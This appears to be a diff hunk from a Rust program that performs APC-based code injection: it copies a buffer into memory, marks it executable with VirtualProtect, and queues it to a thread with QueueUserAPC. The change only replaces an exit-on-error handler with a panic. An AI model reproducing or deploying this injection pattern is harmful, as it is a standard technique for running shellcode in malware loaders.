@@ -59,12 +59,9 @@ fn main() {
         copy(buf.as_ptr() as _, address, buf.len());
 
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect).unwrap_or_else(
-            |e| {
-                eprintln!("[!] VirtualProtect Failed With Error: {e}");
-                exit(-1);
-            },
-        );
+        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
+            panic!("[!] VirtualProtect Failed With Error: {e}");
+        });
 
         QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0);
 
